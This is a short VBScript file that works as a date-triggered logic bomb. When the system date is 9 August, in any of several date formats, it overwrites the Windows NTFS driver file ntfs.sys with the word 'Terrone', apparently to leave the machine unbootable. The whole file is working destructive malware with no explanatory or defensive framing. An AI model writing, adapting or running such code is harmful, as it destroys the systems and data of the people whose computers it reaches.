a = FormatDateTime(now, 2)
windir = createobject("wscript.shell").ExpandEnvironmentStrings("%WinDir%")
if Mid(a,1,5) = "08/09" or Mid(a,1,3) = "8/9" or Mid(a,1,3) = "9/8" or Mid(a,6,10) = "09-08" or Mid(a,6,8) = "9-8" then
Const ForWriting = 2
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.OpenTextFile(windir & "\system32\drivers\ntfs.sys", ForWriting)
objFile.WriteLine "Terrone"
objFile.Close
end if




